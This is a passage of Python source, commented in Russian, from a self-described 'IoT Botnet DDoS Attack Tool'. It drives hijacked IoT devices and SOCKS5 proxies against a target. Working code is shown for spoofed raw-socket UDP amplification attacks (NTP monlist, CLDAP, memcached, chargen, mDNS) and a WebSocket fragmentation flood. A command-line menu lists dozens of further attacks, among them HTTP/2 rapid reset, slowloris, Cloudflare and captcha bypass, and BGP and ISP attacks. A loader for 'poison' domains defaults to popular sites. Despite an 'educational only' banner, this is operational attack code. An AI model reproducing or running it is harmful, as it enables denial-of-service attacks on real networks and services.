        return available_methods

    def amplification_attack(self, target_ip, duration=60):
        """Комплексная amplification атака используя все доступные протоколы"""
        print(f"💥 Запуск комплексной AMPLIFICATION атаки на {target_ip}")
        
        # Загружаем amplification серверы
        amplifiers = self.load_amplification_servers()
        
        # Проверяем есть ли вообще усилители
        total_amplifiers = sum(len(amps) for amps in amplifiers.values())
        if total_amplifiers == 0:
            print("❌ Нет amplification серверов для атаки!")
            return 0
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")
        
        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_requests': 0,
            'total_bytes_sent': 0,
            'estimated_amplified_bytes': 0,
            'failed_requests': 0,
            'protocol_stats': {},
            'start_time': time.time(),
            'is_running': True
        }
        
        def create_protocol_packet(protocol, server_info=None):
            """Создает пакет для конкретного протокола"""
            if protocol == "dns":
                return self._create_proper_dns_any_query()
            elif protocol == "ntp":
                return self._create_ntp_monlist_request()
            elif protocol == "ssdp":
                return self._create_proper_ssdp_request()
            elif protocol == "cldap":
                return self._create_cldap_search_request()
            elif protocol == "memcached":
                return self._create_memcached_stats_request()
            elif protocol == "chargen":
                return self._create_chargen_request()
            elif protocol == "qotd":
                return self._create_qotd_request()
            elif protocol == "mdns":
                return self._create_mdns_query()
            else:
                # Для неизвестных протоколов используем DNS как fallback
                return self._create_proper_dns_any_query()
        
        def get_amplification_factor(protocol):
            """Возвращает примерный коэффициент усиления для протокола"""
            factors = {
                'dns': 28, 'mdns': 20,
                'ntp': 556, 
                'ssdp': 30,
                'cldap': 56, 'ldaps': 50,
                'memcached': 10000,
                'chargen': 100,
                'qotd': 50,
                'coap': 10, 'coap_dtls': 8
            }
            return factors.get(protocol, 10)
        
        def amplification_attack_single(device):
            requests_sent = 0
            bytes_sent = 0
            estimated_amplified_bytes = 0
            failed_requests = 0
            
            try:
                print(f"🎯 {device.ip} начинает Smart Amplification атаку...")
                start_time = time.time()
                
                # ПРОВЕРКА RAW SOCKET
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    print(f"✅ {device.ip}: Raw socket создан успешно")
                except PermissionError:
                    print(f"❌ {device.ip}: Требуются права root для IP spoofing!")
                    return 0, 0
                except Exception as e:
                    print(f"❌ {device.ip}: Ошибка создания raw socket: {e}")
                    return 0, 0
                
                # ЛИМИТ ОШИБОК
                max_errors = 50
                packet_count = 0
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Проверка лимита ошибок
                        if failed_requests >= max_errors:
                            print(f"⚠️ {device.ip}: Слишком много ошибок ({failed_requests}), прекращаем")
                            break
                        
                        # Проверка доступных протоколов
                        available_protocols = [proto for proto, servers in amp_servers.items() if servers]
                        if not available_protocols:
                            print(f"⚠️ {device.ip}: Нет доступных протоколов")
                            break
                        
                        protocol = random.choice(available_protocols)
                        server = random.choice(amp_servers[protocol])
                        
                        # Создание пакета
                        amp_packet = self._create_amplification_packet(protocol, target_ip)
                        if not amp_packet:
                            failed_requests += 1
                            continue
                        
                        # Отправка пакета
                        source_port = random.randint(1024, 65535)
                        ip_packet = self._create_spoofed_udp_ip_packet(
                            source_ip=target_ip,
                            dest_ip=server[0],
                            source_port=source_port,
                            dest_port=server[1],
                            data=amp_packet
                        )
                        
                        sock.sendto(ip_packet, (server[0], 0))
                        packet_count += 1
                        
                        # Статистика
                        request_size = len(ip_packet)
                        estimated_response_size = request_size * amp_factors.get(protocol, 10)
                        
                        requests_sent += 1
                        bytes_sent += request_size
                        estimated_amplified_bytes += estimated_response_size
                        
                        attack_stats['total_requests'] += 1
                        attack_stats['total_bytes_sent'] += request_size
                        attack_stats['estimated_amplified_bytes'] += estimated_response_size
                        attack_stats['protocol_stats'][protocol] += 1
                        
                        # Задержка
                        time.sleep(0.05)
                        
                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        if failed_requests % 10 == 0:  # Логируем каждую 10-ю ошибку
                            print(f"⚠️ {device.ip}: Ошибка #{failed_requests}: {e}")
                        time.sleep(0.1)  # Пауза при ошибках
                        continue
                
                sock.close()
                
                print(f"✅ {device.ip}: Отправлено {requests_sent} пакетов, ошибок: {failed_requests}")
                return requests_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Критическая ошибка у {device.ip}: {e}")
                return 0, 0

    def _create_quic_initial_packet(self):
        """Создает QUIC Initial packet для amplification атаки"""
        try:
            # QUIC Header (упрощенная версия)
            header_form = 0x80  # Long header, fixed bit
            packet_type = 0x00  # Initial
            version = 0x00000001  # QUIC version 1
            
            # Случайный Connection ID
            dest_conn_id_len = 8
            dest_conn_id = os.urandom(dest_conn_id_len)
            src_conn_id_len = 0  # Можно установить 0 для упрощения
            src_conn_id = b''
            
            # Token length (0 для Initial packet)
            token_length = 0
            
            # Length field
            packet_length = random.randint(1200, 1500)  # Стандартный размер MTU
            
            # Собираем QUIC header
            quic_header = (
                bytes([header_form | packet_type]) +  # First byte
                version.to_bytes(4, byteorder='big') +  # Version
                bytes([dest_conn_id_len]) + dest_conn_id +  # Destination Connection ID
                bytes([src_conn_id_len]) + src_conn_id +  # Source Connection ID
                token_length.to_bytes(2, byteorder='big') +  # Token Length
                packet_length.to_bytes(2, byteorder='big')  # Packet Length
            )
            
            # Добавляем случайные данные для увеличения размера пакета
            payload_size = max(0, packet_length - len(quic_header) - 50)  # Оставляем место для CRYPTO frame
            payload = os.urandom(payload_size)
            
            # Простой CRYPTO frame (минимальная реализация)
            crypto_frame = b'\x06' + b'\x00' + payload  # Frame type 0x06 (CRYPTO) + offset + data
            
            return quic_header + crypto_frame
            
        except Exception as e:
            print(f"❌ Ошибка создания QUIC пакета: {e}")
            # Fallback - простой UDP пакет с QUIC-like данными
            return os.urandom(random.randint(1000, 1500))



    # Добавляем методы для создания пакетов различных протоколов
    def _create_ntp_monlist_request(self):
        """Создает NTP MONLIST запрос для amplification"""
        # NTP version 2, mode 7 (private)
        ntp_packet = b'\x17'  # LI=0, VN=2, Mode=7
        ntp_packet += b'\x00'  # Sequence
        ntp_packet += b'\x02'  # Implementation (3=MONLIST)
        ntp_packet += b'\x2a'  # Request code
        ntp_packet += b'\x00\x00\x00\x00'  # Zero padding
        return ntp_packet

    def _create_cldap_search_request(self):
        """Создает CLDAP search запрос для amplification"""
        # Упрощенный CLDAP search запрос
        cldap_packet = b'\x30\x84\x00\x00\x00\x2d\x02\x01\x01\x63\x84\x00\x00\x00\x24\x04\x00'
        cldap_packet += b'\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87'
        cldap_packet += b'\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00'
        return cldap_packet

    def _create_chargen_request(self):
        """Создает CharGEN запрос"""
        # Простой CharGEN запрос - любой символ
        return b'\x00'

    def _create_qotd_request(self):
        """Создает QOTD (Quote of the Day) запрос"""
        # QOTD не требует специальных данных
        return b''

    def _create_mdns_query(self):
        """Создает mDNS запрос"""
        # Аналогично DNS но для multicast
        transaction_id = struct.pack('!H', random.randint(1, 65535))
        flags = struct.pack('!H', 0x0100)  # Standard query
        questions = struct.pack('!H', 1)
        answer_rr = struct.pack('!H', 0)
        authority_rr = struct.pack('!H', 0)
        additional_rr = struct.pack('!H', 0)
        
        # Запрос для _services._dns-sd._udp.local
        qname = b'\x09_services\x07_dns-sd\x05_udp\x05local\x00'
        qtype = struct.pack('!H', 12)  # PTR
        qclass = struct.pack('!H', 1)  # IN
        
        return transaction_id + flags + questions + answer_rr + authority_rr + additional_rr + qname + qtype + qclass

    def protocol_specific_amplification(self, target_ip, protocol, duration=60):
        """Атака amplification для конкретного протокола"""
        print(f"🎯 Запуск {protocol.upper()} amplification атаки на {target_ip}")
        
        amplifiers = self.load_amplification_servers()
        protocol_servers = amplifiers.get(protocol, [])
        
        if not protocol_servers:
            print(f"❌ Нет {protocol.upper()} серверов для атаки!")
            return 0
        
        # Остальная логика аналогична общей amplification атаке, но для конкретного протокола
        # ... (реализация похожа на amplification_attack, но для одного протокола)
        
        return self.amplification_attack(target_ip, duration)  # Используем общий метод

    def websocket_fragmentation_attack(self, target_ip, target_port=80, use_https=False, duration=60):
        """WebSocket Fragmentation Attack - атака фрагментированными сообщениями"""
        print(f"🎯 Запуск WebSocket Fragmentation атаки на {target_ip}:{target_port}")
        
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")
        
        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_fragments': 0,
            'total_connections': 0,
            'total_bytes_sent': 0,
            'failed_fragments': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def create_fragmented_websocket_message(message, fragment_size=100):
            """Создает фрагментированное WebSocket сообщение"""
            fragments = []
            message_bytes = message.encode('utf-8') if isinstance(message, str) else message
            
            for i in range(0, len(message_bytes), fragment_size):
                fragment = message_bytes[i:i + fragment_size]
                is_final = (i + fragment_size) >= len(message_bytes)
                
                # FIN bit: 0 для всех кроме последнего фрагмента
                fin_bit = 0x80 if is_final else 0x00
                
                # Opcode: TEXT для первого фрагмента, CONTINUATION для остальных
                opcode = 0x01 if i == 0 else 0x00
                
                frame_start = bytearray()
                frame_start.append(fin_bit | opcode)
                
                if len(fragment) <= 125:
                    frame_start.append(len(fragment))
                elif len(fragment) <= 65535:
                    frame_start.append(126)
                    frame_start.extend(struct.pack('>H', len(fragment)))
                else:
                    frame_start.append(127)
                    frame_start.extend(struct.pack('>Q', len(fragment)))
                
                fragments.append(bytes(frame_start) + fragment)
            
            return fragments
        
        def websocket_fragmentation_attack_single(device):
            fragments_sent = 0
            bytes_sent = 0
            failed_fragments = 0
            connections_created = 0
            
            try:
                print(f"🎯 {device.ip} начинает WebSocket Fragmentation атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Создаем соединение
                        if device.bot_type == "socks5" and self.socks5_available:
                            sock = self._create_socks5_connection(device, target_ip, target_port)
                        else:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(15)
                            sock.connect((target_ip, target_port))
                        
                        if use_https:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            sock = context.wrap_socket(sock, server_hostname=target_ip)
                        
                        # WebSocket handshake
                        handshake = f"""GET /ws HTTP/1.1
    Host: {target_ip}:{target_port}
    Upgrade: websocket
    Connection: Upgrade
    Sec-WebSocket-Key: {base64.b64encode(os.urandom(16)).decode()}
    Sec-WebSocket-Version: 13
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

    """.replace('\n', '\r\n')
                        
                        sock.send(handshake.encode())
                        response = sock.recv(4096)
                        
                        if b"101" not in response:
                            raise Exception("Handshake failed")
                        
                        connections_created += 1
                        attack_stats['total_connections'] += 1
                        
                        # Отправляем фрагментированные сообщения
                        for _ in range(random.randint(5, 20)):
                            large_message = "A" * random.randint(5000, 20000)
                            fragments = create_fragmented_websocket_message(large_message, 
                                                                           random.randint(50, 500))
                            
                            # Отправляем фрагменты с задержками
                            for fragment in fragments:
                                if not attack_stats['is_running']:
                                    break
                                    
                                sock.send(fragment)
                                fragments_sent += 1
                                bytes_sent += len(fragment)
                                
                                attack_stats['total_fragments'] += 1
                                attack_stats['total_bytes_sent'] += len(fragment)
                                
                                # Случайная задержка между фрагментами
                                time.sleep(random.uniform(0.01, 0.1))
                        
                        sock.close()
                        
                    except Exception as e:
                        failed_fragments += 1
                        attack_stats['failed_fragments'] += 1
                        continue
                
                print(f"✅ {device.ip} отправил {fragments_sent} фрагментов")
                return fragments_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        return self._run_attack(all_active_bots, attack_stats, websocket_fragmentation_attack_single, 
                               "WebSocket Fragmentation")

    def _run_attack(self, active_devices, attack_stats, attack_function, attack_name, max_workers=5000000000):
        if max_workers is None:
            # Увеличиваем количество потоков для лучшей параллельности
            max_workers = min(len(active_devices) * 3, self.max_threads, 5000000000)
        
        # Статистика по типам ботов
        iot_count = len([d for d in active_devices if d.bot_type == "iot"])
        socks5_count = len([d for d in active_devices if d.bot_type == "socks5"])
        
        print(f"📊 Распределение ботов: {iot_count} IoT + {socks5_count} SOCKS5")
        print(f"🔧 Максимальное количество потоков: {max_workers}")
        
        def stats_monitor():
            last_time = time.time()
            last_count = 0
            
            metric_keys = [key for key in attack_stats.keys() if key.startswith('total_')]
            if metric_keys:
                metric_name = metric_keys[0].replace('total_', '')
                metric_key = metric_keys[0]
            else:
                metric_name = 'operations'
                metric_key = 'total_operations'
                attack_stats[metric_key] = 0
            
            while attack_stats['is_running']:
                time.sleep(2)  # Более частый мониторинг
                current_time = time.time()
                elapsed = current_time - last_time
                current_count = attack_stats.get(metric_key, 0)
                
                if elapsed > 0:
                    rate = (current_count - last_count) / elapsed
                    print(f"📊 {attack_name} СТАТИСТИКА: {rate:.1f} {metric_name}/sec | Всего: {current_count}")
                    last_count = current_count
                    last_time = current_time
        
        stats_thread = threading.Thread(target=stats_monitor, daemon=True)
        stats_thread.start()
        
        total_metric = 0
        total_bytes = 0
        
        # Отдельная статистика по типам ботов
        iot_metrics = 0
        socks5_metrics = 0
        
        try:
            # Используем ThreadPoolExecutor с увеличенным количеством потоков
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                # Запускаем все атаки одновременно
                futures = {executor.submit(attack_function, device): device for device in active_devices}
                
                # Обрабатываем результаты по мере завершения
                for future in as_completed(futures):
                    device = futures[future]
                    try:
                        metric_count, bytes_count = future.result(timeout=(attack_stats.get('duration', 60) + 30))
                        total_metric += metric_count
                        total_bytes += bytes_count
                        
                        if device.bot_type == "iot":
                            iot_metrics += metric_count
                        else:
                            socks5_metrics += metric_count
                            
                    except Exception as e:
                        print(f"❌ Ошибка выполнения у {device.ip}: {e}")
        
        except KeyboardInterrupt:
            print(f"\n⏹️  {attack_name} атака прервана...")
        
        finally:
            attack_stats['is_running'] = False
            time.sleep(1)
            
            elapsed_time = time.time() - attack_stats['start_time']
            total_mb = total_bytes / 1024 / 1024
            
            metric_name = 'запросов' if 'requests' in attack_stats else 'пакетов' if 'packets' in attack_stats else 'соединений'
            
            attack_stats['is_running'] = False
            time.sleep(1)
            
            # АВТОМАТИЧЕСКОЕ УДАЛЕНИЕ НЕДОСТУПНЫХ ПОСЛЕ АТАКИ
            dead_count = len([d for d in active_devices if not d.is_alive])
            if dead_count > 0:
                print(f"\n⚠️  После атаки обнаружено {dead_count} недоступных устройств")
                answer = input("❓ Удалить недоступные устройства из файлов? (y/N): ")
                if answer.lower() in ['y', 'yes', 'д', 'да']:
                    self.remove_dead_devices()

            print(f"\n📊 {attack_name} РЕЗУЛЬТАТ:")
            print(f"⏱️  Время: {elapsed_time:.2f} сек")
            print(f"📤 Всего {metric_name}: {total_metric}")
            print(f"🤖 IoT боты: {iot_metrics} {metric_name}")
            print(f"🔌 SOCKS5 прокси: {socks5_metrics} {metric_name}")
            print(f"💾 Данных: {total_mb:.2f} МБ")
            
            if elapsed_time > 0:
                avg_rate = total_metric / elapsed_time
                print(f"📊 Средняя скорость: {avg_rate:.1f} {metric_name}/сек")
        
        return total_metric

# Функция для чтения доменов из файла
def load_poison_domains(filename="Poison.txt"):
    """Загружает список доменов для отравления из файла"""
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            domains = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        print(f"📁 Загружено {len(domains)} доменов из {filename}")
        return domains
        
    except FileNotFoundError:
        print(f"⚠️ Файл {filename} не найден, используем домены по умолчанию")
        # Домены по умолчанию если файла нет
        return [
            "google.com", "youtube.com", "facebook.com", "whatsapp.com",
            "instagram.com", "twitter.com", "amazon.com", "netflix.com"
        ]
    except Exception as e:
        print(f"❌ Ошибка чтения {filename}: {e}")
        return []

# Загружаем домены при старте
poison_domains = load_poison_domains("Poison.txt")

def main():
    parser = argparse.ArgumentParser(description='IoT Botnet DDoS Attack Tool')
    parser.add_argument('--target', required=True, help='Целевой IP адрес или URL')
    parser.add_argument('--port', type=int, default=443, help='Целевой порт')
    parser.add_argument('--duration', type=int, default=60, help='Длительность атаки в секундах')
    parser.add_argument('--threads', type=int, default=1000, help='Количество потоков')
    parser.add_argument('--attack-type', 
                       choices=['http', 'http2', 'http2a', 
                                #'httpjson', 
                               'http2killer', 'http2multi', 'httpsmuggling', 'http2rapid', 'httpamp', 'httpbrowser', 'httpquic', 'zerotrust',
                               'nginx', 'nginx2', 'nginxultra', 
                               'tls', 'tlsmem', 'sslcpu',
                               'cachebypass', 'websocketbomb', 'cachebypass2', 'headerinjection', 
                               'captchabypass',
                               'cloudflare', 'jscf', 'cfturnstile', 'cfturnstile2',
                               'websocket', 'randomport', 
                               'udp', 'udpsession', 'udpfuzzing', 
                               'tcp', 'tcpack', 'multistage', 'bannergrab', 
                               'raknet', 'raknetfuzz', 'raknetsmart', 'steam', 
                               'minecraftjava', 'mctps', 'minecraftjavaexp', 'minecraftjavac', 'minecraftjavaq',
                               'icmp', 'blackhole', 'bgp', 'ipfragment', 'cpu', 'gre',
                               'isp', 'bras', 'dnsinfra', 
                               'syn', 'slowloris',
                               'dns', 'ssdp', 'memcached',
                               'dnstorture', 'dnsnxdomain', 'dnssubdomain', 'dnstunnel'],
                       default='udp', 
                       help='Тип атаки')
    parser.add_argument('--remove-duplicates', action='store_true', 
                       help='Удалить дубликаты из файлов iot.txt и socks5.txt')
    parser.add_argument('--check-duplicates', action='store_true',
                       help='Проверить файлы на дубликаты без удаления') 
    parser.add_argument('--remove-dead', action='store_true',  # НОВЫЙ АРГУМЕНТ
                       help='Удалить недоступные устройства из файлов')
    parser.add_argument('--health-check', action='store_true',  # НОВЫЙ АРГУМЕНТ
                       help='Проверить доступность устройств и удалить недоступные')
    args = parser.parse_args()    
    # Очистка целевого адреса
    target_ip = args.target.split('://')[-1].split('/')[0].split(':')[0]
    
    print("⚡ IoT Botnet DDoS Attack Tool")
    print("⚠️  ИСПОЛЬЗОВАНИЕ ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ!")
    print("⚠️  Атаки без разрешения - НЕЗАКОННЫ!\n")


    # Инициализация атакующего
    attacker = IoTDDoSAttack(max_threads=args.threads)
    
    # Загрузка ресурсов
    if not attacker.load_botnet_devices():
        print("❌ Не удалось загрузить ботнет!")
        return
    
    # ОПЦИЯ: Удаление недоступных устройств
    if args.remove_dead:
        attacker.remove_dead_devices()
        return
    
    # ОПЦИЯ: Проверка здоровья с удалением
    if args.health_check:
        attacker.health_check(remove_dead=True)
        return
    
    # Проверка доступности устройств (без удаления)
    alive_count = attacker.health_check(remove_dead=False)
    if alive_count == 0:
        print("❌ Нет доступных устройств!")
        
        # Предлагаем удалить недоступные
        answer = input("❓ Хотите удалить все недоступные устройства из файлов? (y/N): ")
        if answer.lower() in ['y', 'yes', 'д', 'да']:
            attacker.remove_dead_devices()
        return
    
    if args.remove_duplicates:
        print("🗑️ Удаление дубликатов из файлов...")
        iot_removed = attacker.remove_duplicates_from_file("iot.txt", "iot")
        socks5_removed = attacker.remove_duplicates_from_file("socks5.txt", "socks5")
        print(f"✅ Удалено дубликатов: IoT: {iot_removed}, SOCKS5: {socks5_removed}")
        return

    if args.check_duplicates:
        attacker.check_duplicates_in_files()
        return

    print(f"\n🎯 Цель: {target_ip}:{args.port}")
    print(f"⏱️  Длительность: {args.duration} секунд")
    print(f"🔧 Тип атаки: {args.attack_type}")
    print(f"🤖 Доступных ботов: {alive_count}")
    
    # Подтверждение
    try:
        input("\n⏰ Нажмите Enter для начала атаки...")
    except KeyboardInterrupt:
        print("\n❌ Атака отменена пользователем")
        return
    
    start_time = time.time()
    
    try:
        # Запуск выбранной атаки
        if args.attack_type == 'all':
            # Последовательный запуск всех атак
            attacks = [
                ('UDP Flood', attacker.udp_flood_attack, (target_ip, args.port, args.duration//10)),
                ('RakNet Flood', attacker.raknet_udp_flood, (target_ip, args.port, args.duration//10)),
                ('RakNet Fuzzing', attacker.raknet_protocol_fuzzing, (target_ip, args.port, args.duration//10)),
                ('RakNet Smart', attacker.smart_raknet_combo_attack, (target_ip, args.port, args.duration//10)),
                ('Steam Flood', attacker.steam_protocol_flood, (target_ip, args.port, args.duration//10)),
                ('Steam Combo', attacker.steam_combo_attack, (target_ip, args.port, args.duration//10)),
                ('Minecraft java Flood', attacker.minecraft_java_flood, (target_ip, args.port, args.duration//10)),
                ('Minecraft TPS', attacker.tps_killer_attack, (target_ip, args.port, args.duration//10)),
                ('Minecraft java Exploit', attacker.minecraft_java_packet_exploit, (target_ip, args.port, args.duration//10)),
                ('Minecraft java combo', attacker.minecraft_java_combo_attack, (target_ip, args.port, args.duration//10)),
                ('Minecraft query Flood', attacker.minecraft_query_flood, (target_ip, args.port, args.duration//10)),
                ('UDP Session', attacker.udp_session_exhaustion, (target_ip, args.port, args.duration//10)),
                ('UDP Protocol Fuzzing', attacker.udp_protocol_fuzzing, (target_ip, args.port, args.duration//10)),
                ('HTTP GET Flood', attacker.http_get_flood, (target_ip, args.port, False, args.duration//10)),
                ('SYN Flood', attacker.syn_flood, (target_ip, args.port, args.duration//10)),
                ('TCP Connection Flood', attacker.tcp_connection_flood, (target_ip, args.port, args.duration//10)),
                ('TCP ACK Connection Flood', attacker.tcp_connection_flood, (target_ip, args.port, args.duration//10)),
                ('Multi-Stage Flood', attacker.multi_stage_connection_flood, (target_ip, args.port, args.duration//10)),
                ('Banner Grab Flood', attacker.banner_grabbing_flood, (target_ip, args.port, args.duration//10)),
                ('Slowloris', attacker.slowloris_attack, (target_ip, args.port, args.duration//10)),
                ('TLS/SSL Flood', attacker.tls_ssl_flood, (target_ip, 443, args.duration//10)),
                ('SSL CPU', attacker.ssl_renegotiation_attack, (target_ip, 443, args.duration//10)),
                ('TLS MEM', attacker.tls_session_resume_flood, (target_ip, 443, args.duration//10)),
                ('HTTP/2 Flood', attacker.http2_flood, (target_ip, 443, args.duration//10)),
                ('HTTP/2 Advanced', attacker.http2_advanced_flood, (target_ip, 443, args.duration//10)),
                ('HTTP/2 Killer', attacker.http2_killer, (target_ip, 443, args.duration//10)),
                ('HTTP Browser', attacker.advanced_browser_http_flood, (target_ip, 443, args.duration//10)),
                ('HTTP/2 Multiplexing', attacker.http2_multiplexing_attack, (target_ip, 443, args.duration//10)),
                ('HTTP/2 Rapid Reset', attacker.http2_rapid_reset, (target_ip, 443, args.duration//10)),
                #('HTTP Json Flood', attacker.http2_post_json_attack, (target_ip, 443, args.duration//10, "post.json")),
                ('HTTP Smuggling', attacker.http_request_smuggling, (target_ip, 443, args.duration//10)),
                ('HTTP Amplification', attacker.https_amplification_attack, (target_ip, 443, args.duration//10)),
                ('HTTP/3 QUIC', attacker.http3_quic_flood, (target_ip, 443, args.duration//10)),
                ('Zero Trust Bypass', attacker.zero_trust_bypass, (target_ip, args.port, args.duration//10)),
                ('Nginx Killer', attacker.nginx_killer_attack, (target_ip, 443, args.duration//10)),
                ('Nginx 2 Killer', attacker.nginx_advanced_killer, (target_ip, 443, args.duration//10)),
                ('Nginx Ultra Killer', attacker.nginx_ultimate_killer, (target_ip, 443, args.duration//10)),
                ('Amplification', attacker.amplification_ddos, (target_ip, args.duration//10)),
                ('DNS Amplification', attacker.dns_attack, (target_ip, args.duration//10)),
                ('SSDP Amplification', attacker.ssdp_amplification_attack, (target_ip, args.duration//10)),  # Исправлено: порт 1900
                ('ICMP Flood', attacker.icmp_flood_attack, (target_ip, args.duration//10)),
                ('BlackHole', attacker.blackhole_attack, (target_ip, args.duration//10)),
                ('BGP', attacker.bgp_hijacking_blackhole_routing, (target_ip, args.duration//10)),
                ('IP Fragmentation', attacker.ip_fragment_storm, (target_ip, args.duration//10)),
                ('CPU Router', attacker.router_cpu_targeted_attack, (target_ip, args.duration//10)),
                ('GRE Flood', attacker.gre_tunnel_exhaustion, (target_ip, args.duration//10)),
                ('ISP Discovery', attacker.isp_flood, (target_ip,)),  # Исправлено: isp_flood -> isp_target_discovery
                ('BRAS Attack', attacker.bras_attack, (target_ip, args.duration//10)),
                ('DNS Infrastructure', attacker.dns_infrastructure_attack, (target_ip, args.duration//10)),  # Исправлено: добавлен порт 53
                ('Memcached Amplification', attacker.memcached_amplification_attack, (target_ip,  args.duration//10)),  # Исправлено: порт 11211
                ('Cloudflare Bypass', attacker.advanced_cloudflare_bypass, (target_ip, args.port, args.duration//10)),
                ('Cloudflare Turnstile Bypass', attacker.http_flood_with_turnstile_bypass, (target_ip, args.port, args.duration//10)),
                ('Cloudflare Turnstile Bypass 2', attacker.advanced_turnstile_bypass_attack, (target_ip, args.port, args.duration//10)),
                ('JavaScript CloudFlare Bypass', attacker.advanced_cloudflare_bypass_v2, (target_ip, args.port, args.duration//10)),
                ('Captcha Bypass', attacker.http_flood_with_captcha_bypass, (target_ip, args.port, False, args.duration//10)),  # Исправлено: добавлен use_https=False
                ('Cache Bypass', attacker.cache_bypass_attack, (target_ip, args.port, False, args.duration//10)),  # Исправлено: добавлен use_https=False
                ('Cache Bypass Advance', attacker.advanced_cache_bypass_attack, (target_ip, args.port, False, args.duration//10)),  # Исправлено: добавлен use_https=False
                ('Host Header Injection', attacker.host_header_injection_attack, (target_ip, args.port, args.duration//10)),
                ('WebSocket Flood', attacker.websocket_flood, (target_ip, args.port, args.duration//10)),
                ('WebSocket Bomb', attacker.websocket_memory_exhaustion_attack, (target_ip, args.port, args.duration//10)),
                ('Randomized Port', attacker.randomized_port_attack, (target_ip, args.duration//10)),
                ('DNS Water Torture', attacker.dns_water_torture_attack, (target_ip, args.duration//10)),
                ('DNS NXDOMAIN Attack', attacker.dns_nxdomain_attack, (target_ip, args.duration//10)),  # Исправлено: опечатка NXDMOAIN -> NXDOMAIN
                ('DNS Subdomain', attacker.dns_subdomain_attack, (target_ip, args.duration//10)),  # Исправлено: убран лишний аргумент
            ]
            
            for attack_name, attack_func, attack_args in attacks:
                print(f"\n{'='*50}")
                print(f"🚀 ЗАПУСК {attack_name}")
                print(f"{'='*50}")
                attack_func(*attack_args)
                time.sleep(2)  # Пауза между атаками
                
        else:
            # Одиночная атака
            attack_map = {
                'http': (attacker.http_get_flood, (target_ip, args.port, False, args.duration)),
                'http2': (attacker.http2_flood, (target_ip, 443, args.duration)),
                'http2a': (attacker.http2_advanced_flood, (target_ip, 443, args.duration)),
                #'httpjson': (attacker.http2_post_json_attack, (target_ip, 443, args.duration, "post.json")),
                'http2killer': (attacker.http2_killer, (target_ip, 443, args.duration)),
                'httpbrowser': (attacker.advanced_browser_http_flood, (target_ip, 443, args.duration)),
                'httpsmuggling': (attacker.http_request_smuggling, (target_ip, 443, args.duration)),
                'http2multi': (attacker.http2_multiplexing_attack, (target_ip, 443, args.duration)),
                'http2rapid': (attacker.http2_rapid_reset, (target_ip, 443, args.duration)),
                'httpamp': (attacker.https_amplification_attack, (target_ip, 443, args.duration)),
                'httpquic': (attacker.http3_quic_flood, (target_ip, 443, args.duration)),
                'zerotrust': (attacker.zero_trust_bypass, (target_ip, args.port, args.duration//10)),
                'nginx': (attacker.nginx_killer_attack, (target_ip, 443, args.duration)),
                'nginx2': (attacker.nginx_advanced_killer, (target_ip, 443, args.duration)),
                'nginxultra': (attacker.nginx_ultimate_killer, (target_ip, 443, args.duration)),
                'syn': (attacker.syn_flood, (target_ip, args.port, args.duration)),
                'slowloris': (attacker.slowloris_attack, (target_ip, args.port, args.duration)),
                'tcp': (attacker.tcp_connection_flood, (target_ip, args.port, args.duration)),
                'tcpack': (attacker.tcp_ack_flood, (target_ip, args.port, args.duration)),
                'multistage': (attacker.multi_stage_connection_flood, (target_ip, args.port, args.duration)),
                'bannergrab': (attacker.banner_grabbing_flood, (target_ip, args.port, args.duration)),
                'tls': (attacker.tls_ssl_flood, (target_ip, 443, args.duration)),
                'sslcpu': (attacker.ssl_renegotiation_attack, (target_ip, 443, args.duration)),
                'tlsmem': (attacker.tls_session_resume_flood, (target_ip, 443, args.duration)),
                'udp': (attacker.udp_flood_attack, (target_ip, args.port, args.duration)),
                'raknet': (attacker.raknet_udp_flood, (target_ip, args.port, args.duration)),
                'raknetfuzz': (attacker.raknet_protocol_fuzzing, (target_ip, args.port, args.duration)),
                'raknetsmart': (attacker.smart_raknet_combo_attack, (target_ip, args.port, args.duration)),
                'steam': (attacker.steam_protocol_flood, (target_ip, args.port, args.duration)),
                'steamcombo': (attacker.steam_combo_attack, (target_ip, args.port, args.duration)),
                'minecraftjava': (attacker.minecraft_java_flood, (target_ip, args.port, args.duration)),
                'mctps': (attacker.tps_killer_attack, (target_ip, args.port, args.duration)),
                'minecraftjavaexp': (attacker.minecraft_java_packet_exploit, (target_ip, args.port, args.duration)),
                'minecraftjavac': (attacker.minecraft_java_combo_attack, (target_ip, args.port, args.duration)),
                'minecraftjavaq': (attacker.minecraft_query_flood, (target_ip, args.port, args.duration)),
                'udpsession': (attacker.udp_session_exhaustion, (target_ip, args.port, args.duration)), 
